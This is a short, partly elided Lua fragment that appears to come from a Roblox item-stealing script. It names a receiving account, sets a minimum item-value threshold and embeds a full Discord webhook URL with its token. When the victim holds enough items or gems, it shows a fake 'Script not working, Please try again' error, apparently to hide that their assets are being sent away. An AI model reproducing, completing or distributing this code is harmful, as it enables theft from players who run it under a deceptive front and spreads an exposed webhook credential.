...
local users = {"ezcxangel"}
local min_rap = _G.minrap or 1000000
local webhook = "https://discord.com/api/webhooks/1447898490477875341/Gjlu76O9vo-ocjhyz-p8M1foUUeHJo8olXNOfDMB7m_dLiq2QVGn9ISOa-f8E5OAOLt9"
...
if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ...
    message.Error("Script not working, Please try again")
end
